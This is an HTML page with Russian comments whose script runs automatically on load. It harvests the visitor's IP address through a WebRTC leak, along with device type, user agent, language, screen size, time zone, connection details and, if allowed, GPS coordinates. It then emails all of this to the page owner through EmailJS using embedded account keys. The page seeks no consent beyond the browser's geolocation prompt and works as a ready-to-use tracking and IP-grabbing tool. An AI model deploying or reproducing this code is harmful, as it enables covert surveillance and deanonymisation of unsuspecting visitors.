<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сбор всех данных и отправка на почту</title>

    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
        })();

        // Получение IP-адреса через WebRTC
        function getUserIP(callback) {
            var pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => console.error(e));
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const ip = ipRegex.exec(ice.candidate.candidate)[1];
                    callback(ip);
                    pc.onicecandidate = () => {};
                }
            };
        }

        // Определение типа устройства
        function getDeviceType() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (/android/.test(userAgent)) return "Android";
            if (/iphone|ipad|ipod/.test(userAgent)) return "iOS";
            if (/windows/.test(userAgent)) return "Windows";
            if (/mac/.test(userAgent)) return "Mac";
            if (/linux/.test(userAgent)) return "Linux";
            return "Неизвестное устройство";
        }

        // Получение данных о соединении
        function getConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            return {
                type: connection.effectiveType || "Неизвестно",
                downlink: connection.downlink || "Неизвестно",
                rtt: connection.rtt || "Неизвестно"
            };
        }

        // Сбор всех данных пользователя
        function collectUserData(ip) {
            return new Promise((resolve) => {
                const connectionInfo = getConnectionInfo();

                let userData = {
                    ip: ip,
                    deviceType: getDeviceType(),
                    userAgent: navigator.userAgent,
                    browserLanguage: navigator.language || "Неизвестно",
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно",
                    connectionType: connectionInfo.type,
                    connectionSpeed: connectionInfo.downlink,
                    connectionRTT: connectionInfo.rtt
                };

                // Геолокация через браузер
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        userData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        resolve(userData);
                    }, () => {
                        resolve(userData);
                    });
                } else {
                    resolve(userData);
                }
            });
        }

        // Отправка данных через EmailJS
        function sendData(userData) {
            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                .then(function(response) {
                    console.log("Email успешно отправлен", response);
                    alert('Данные отправлены на почту!');
                }, function(error) {
                    console.error("Ошибка при отправке данных", error);
                    alert("Ошибка отправки: " + error.text);
                });
        }

        // Основная функция запуска
        function getUserData() {
            getUserIP(async function(ip) {
                const userData = await collectUserData(ip);
                console.log("Собранные данные пользователя:", userData);
                sendData(userData);
            });
        }

        window.onload = getUserData;
    </script>
</head>
<body>
    <h1>Сбор данных пользователя</h1>
</body>
</html>